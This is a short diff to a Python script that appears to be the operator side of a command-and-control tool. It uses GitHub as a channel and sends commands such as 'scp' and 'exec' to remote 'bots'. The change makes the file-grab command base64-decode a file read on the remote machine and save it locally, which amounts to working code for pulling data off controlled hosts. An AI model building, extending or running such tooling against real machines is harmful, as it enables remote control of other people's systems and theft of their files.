@@ -2,6 +2,7 @@ from github import Github, InputFileContent
 from threading import Thread
 from dotenv import load_dotenv
 from time import time, sleep
+from base64 import b64decode
 from math import floor
 from os import getenv
 
@@ -99,12 +100,18 @@ def cmd_scp(cmd):
     return
 
   try:
-    with open(cmd[3], 'w') as f:
+    with open(cmd[3], 'wb') as f:
       res = submit_to_bot(cmd[1], f'scp {cmd[2]}')
       if res is None:
         return
+
+      if res == 'err':
+        print('ERROR: Unable to read file on remote machine')
+        return
+
+      f.write(b64decode(res))
   except:
-    print('ERROR: Unable to write on your local machine')
+    print('ERROR: Unable to write file on local machine')
     return
 
 def cmd_exec(cmd):
